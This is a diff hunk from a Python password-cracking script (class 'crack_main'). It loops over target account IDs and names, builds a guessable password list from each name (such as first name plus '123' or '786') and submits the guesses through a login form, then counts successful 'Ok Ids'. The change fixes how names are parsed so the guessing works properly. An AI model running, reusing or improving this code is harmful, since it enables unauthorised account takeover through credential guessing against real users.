@@ -514,16 +514,16 @@ class crack_main():
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in self.id:
-                                iid,name = user.split('|')
-                                first_name = user.rsplit(' ')[0]
+                                iid,zee = user.split('|')
+                                first_name = zee.split(' ')[0]
                                 try:
-                                        last_name = user.rsplit(' ')[1]
+                                        last_name = zee.split(' ')[1]
                                 except IndexError:
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.m1,iid,name,passlist)
+                                formSubmit.submit(self.rndm,iid,zee,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
